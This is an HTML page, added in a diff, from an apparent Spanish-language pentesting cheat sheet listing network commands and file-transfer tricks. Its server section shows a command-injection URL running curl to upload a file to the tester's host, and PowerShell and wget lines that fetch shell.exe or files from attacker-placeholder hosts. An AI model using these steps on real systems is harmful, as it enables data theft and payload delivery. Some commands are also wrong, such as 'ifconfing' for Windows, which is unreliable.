@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title class="fab fa-linux">HackSheet Bl3Ak</title>
+    <link rel="stylesheet" href="/css/prism.css">
+    <link rel="icon" href="/images/logo.ico">
+    <link href="/css/estilos.css" rel="stylesheet">
+    <link href="/css/button.css" rel="stylesheet">
+    <link href="/css/linux.css" rel="stylesheet">
+
+
+    <script type="module" src="/cmp/mi-footer.js"></script>
+    <script src="https://kit.fontawesome.com/f67adc3b08.js" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header class="navbar">
+        <img src="/images/logo.gif" class="imglogo" alt="logotipo">
+        <a href="/index.html" class="logo">HackSheet</a>
+        <div class="menu-toggle "></div>
+        <nav>
+            <ul>
+                <li><a href="/index.html" class="linea-center">Home</a> </li>
+
+            </ul>
+        </nav>
+        <div class="clearfix"></div>
+    </header>
+    <script src="https://code.jquery.com/jquery-3.6.0.js"
+        integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous">
+        </script>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.menu-toggle').click(function () {
+                $('.menu-toggle').toggleClass('active')
+                $('nav').toggleClass('active')
+            })
+        })
+    </script>
+
+
+    <div class="main">
+        <img class="linux" src="/images/network.png" alt="logoSqlInjection">
+        <h1> Linea de comandos de Redes</h1>
+        <br>
+        <div class="pasos">Network</div>
+
+        <ul>
+            <li><span class="comando1">Routing Tables</span>
+
+                <ol>
+                    <li><span class="comando2">Linux </span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ip route</code></pre>
+                    </li>
+                    li><span class="comando2">Linux </span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >route</code></pre>
+                    </li>
+                    <li><span class="comando2">Windows</span>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >route print</code></pre>
+                    </li>
+
+                    <li><span class="comando2">OSX</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >netstat -r</code></pre>
+                    </li>
+
+                    <li><span class="comando2">Configuracion de tabla de enrutamiento</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ip route add &lbrack;IP&rbrack;/&lbrack;Classless inter-Domain Routing (CIDR)&rbrack; via &lbrack;Gateway&rbrack;</code></pre>
+                    </li>
+                    <li><span class="comando2">Configuracion de tabla de enrutamiento</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ip route add 192.168.224.2/24 via 10.75.32.1</code></pre>
+                    </li>
+
+                </ol>
+            </li>
+
+            <li><span class="comando1">Direccion MAC de la tarjeta de red</span>
+
+                <ol>
+                    <li><span class="comando2">Linux or MAC</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ifconfig</code></pre>
+                    </li>
+                    <li><span class="comando2">Linux</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ip addr </code></pre>
+                    </li>
+                    <li><span class="comando2">Windows</span>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ifconfing</code></pre>
+                    </li>
+
+
+                </ol>
+            </li>
+
+            <li><span class="comando1">Comprobacion de chache ARP en nuestro host</span>
+
+                <ol>
+                    <li><span class="comando2">Linux</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >ip neighbour</code></pre>
+                    </li>
+
+                    <li><span class="comando2">Windows</span>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >arp -a</code></pre>
+                    </li>
+                    <li><span class="comando2">*nix operating systems</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >arp</code></pre>
+                    </li>
+
+
+
+                </ol>
+            </li>
+
+
+            <li><span class="comando1">Netstat</span>
+                Comprobacion de puertos de escucha y conexiones Actuales (TCP) en un host</span>
+
+                <ol>
+                    <li><span class="comando2">Linux</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >netstat -tunp</code></pre>
+                    </li>
+                    <li><span class="comando2">Linux</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >netstat -p tcp -p udp </code></pre>
+                    </li>
+                    <li><span class="comando2">Linux</span>
+                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >lsof -n -i4TCP -i4UDP</code></pre>
+                    </li>
+
+                    <li><span class="comando2">Windows</span>
+                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
+                            >netstat -ano</code></pre>
+                    </li>
+                    
+
+
+                </ol>
+            </li>
+
+
+
+            <br>
+            <br>
+            <div class="pasos">Montar un Server</div>
+            <br>
+            <img class="center" src="/images/server.png" alt="Server icon">
+            <div class="titulo">WebServer</div>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
+                        >sudo python3 -m http.server 80</code></pre>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                        >sudo python –m SimpleHTTPServer</code></pre>
+            <span class="comando2">SimpleHTTPPutServer, se utiliza con curl</span>
+            <pre><code class="language-python line-numbers" style="white-space:pre-wrap;"data-start="1"
+                >
+                #!/usr/bin/python
+
+                import SimpleHTTPServer
+                import BaseHTTPServer
+                
+                class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+                    def do_PUT(self):
+                        print self.headers
+                        length = int(self.headers["Content-Length"])
+                        path = self.translate_path(self.path)
+                        with open(path, "wb") as dst:
+                            dst.write(self.rfile.read(length))
+                
+                if __name__ == '__main__':
+                    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
+                    </code></pre>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                        > http://&lt;TARGET:PORT&gt;?cmd=curl+&lt;TURN0&gt;+--upload-file+&lt;file&gt;</code></pre>
+
+            <pre><code class="language- line-numbers" style="white-space:pre-wrap;"data-start="1"
+                                > http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip</code></pre>
+
+
+            <br>
+            <img class="center" src="/images/powershell.png" alt="powershell icon">
+            <div class="titulo">PowerShell</div>
+            <span class="comando2">Descarga de archivo</span>
+
+
+            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
+                        >Invoke-WebRequest -uri http://&lt;TURN0&gt;:&lt;PORT&gt;/&lt;reverse/file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>
+
+            <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
+                                >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
+
+
+            <br>
+            <img class="center" src="/images/tux.png" alt="linux icon">
+            <div class="titulo">Linux</div>
+            <span class="comando2">Descarga de archivo</span>
+            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
+                    >wget &lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/file</code></pre>
+
+        </ul>
+    </div>
+
+
+    <script src="/javascript/prism.js"></script>
+    <mi-footer></mi-footer>
+</body>
+
+</html>
